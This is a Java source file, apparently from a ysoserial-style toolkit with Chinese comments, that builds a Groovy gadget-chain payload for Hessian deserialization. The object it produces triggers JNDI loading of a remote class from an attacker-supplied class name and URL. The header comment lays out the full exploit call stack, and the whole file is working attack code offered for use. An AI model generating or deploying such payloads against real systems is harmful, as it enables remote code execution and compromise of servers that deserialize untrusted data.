package cn.butler.hessian.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.hessian.util.UtilFactory;
import cn.butler.yso.payloads.util.Reflections;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.util.Hashtable;

/**
 * Groovy利用链的调用栈: 因为ConvertedClosure不是Comparator类所以不能用TreeMap触发，需要TreeSet触发
 *   -TreeSet#add()
 *    -TreeMap#put()
 *     -new Proxy(org.codehaus.groovy.runtime.MethodClosure)#compareTo("whatever")
 *      -org.codehaus.groovy.runtime.ConversionHandler#invoke
 *       -org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom
 *        -groovy.lang.Closure#call
 *         -groovy.lang.MetaClassImpl#invokeMethod
 *          -javax.naming.spi.ContinuationContext#listBindings
 *           -javax.naming.spi.ContinuationContext#getTargetContext
 *             -javax.naming.spi.NamingManager#getContext
 *               --javax.naming.spi.NamingManager#getObjectInstance
 */
public class Groovy implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String[] parts = command.split(":", 2); // 使用第一个冒号进行切割，限制切割为最多两个部分
        String className = parts[0]; // 第一个部分是类名
        String url = parts[1]; // 第二个部分是URL

        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);

        CannotProceedException cpe = new CannotProceedException();
        Reflections.setFieldValue(cpe, "cause", null);
        Reflections.setFieldValue(cpe, "stackTrace", null);
        cpe.setResolvedObj(new Reference("Foo", className, url));
        Reflections.setFieldValue(cpe, "suppressedExceptions", null);

        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        MethodClosure closure = new MethodClosure(ctx, "listBindings");
        ConvertedClosure convertedClosure = new ConvertedClosure(closure, "compareTo");
        //创建了一个动态代理对象 object，实现了 Comparable 接口，其实际行为由 convertedClosure 定义(ConvertedClosure是InvocationHandler所以我们要用动态代理)。
        Object object = Proxy.newProxyInstance(Groovy.class.getClassLoader(),new Class<?>[]{Comparable.class}, convertedClosure);
        //先填充whatever后object
        return UtilFactory.makeTigger((Object) "whatever",object);
    }

//    public static void main(final String[] args) throws Exception {
//        PayloadRunner.run(Groovy.class, args);
//    }
}
